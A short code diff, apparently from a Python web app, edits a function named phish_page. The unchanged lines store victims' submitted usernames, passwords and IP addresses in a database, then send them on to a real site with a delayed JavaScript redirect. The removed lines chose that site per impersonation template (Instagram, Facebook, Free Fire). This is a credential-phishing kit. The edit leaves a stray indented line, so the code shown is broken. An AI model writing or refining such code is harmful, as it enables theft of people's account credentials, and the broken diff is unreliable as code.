@@ -135,14 +135,7 @@ def phish_page(link_id):
                   (link_id, username, password, ip, datetime.now()))
         conn.commit()
         conn.close()
-        # Redirect based on template
-        if template_name == 'instagram':
-            real_url = 'https://www.instagram.com'
-        elif template_name == 'facebook':
-            real_url = 'https://www.facebook.com'
-        elif template_name == 'freefire':
-            real_url = 'https://ff.garena.com'
-        else:
+       
             real_url = 'https://www.google.com'
         return f"<div style='background:#0a0f1e; color:cyan; text-align:center; padding:50px;'>Redirecting...<script>setTimeout(()=>{{window.location.href='{real_url}'}},2000);</script></div>"
     conn.close()
